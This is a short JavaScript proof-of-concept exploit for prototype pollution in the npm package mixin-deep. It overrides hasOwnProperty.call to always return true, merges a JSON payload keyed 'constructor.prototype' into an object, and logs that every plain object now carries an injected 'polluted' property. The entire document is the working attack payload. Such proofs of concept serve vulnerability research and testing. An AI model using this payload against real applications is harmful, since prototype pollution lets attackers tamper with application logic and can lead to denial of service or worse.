Object.prototype.hasOwnProperty.call = () => true;
const mixin = require('mixin-deep');
let malicious_payload = '{"constructor.prototype": {"polluted":"yes"}}';
let obj = {};
console.log({}.polluted);
mixin({}, JSON.parse(malicious_payload));
console.log({}.polluted);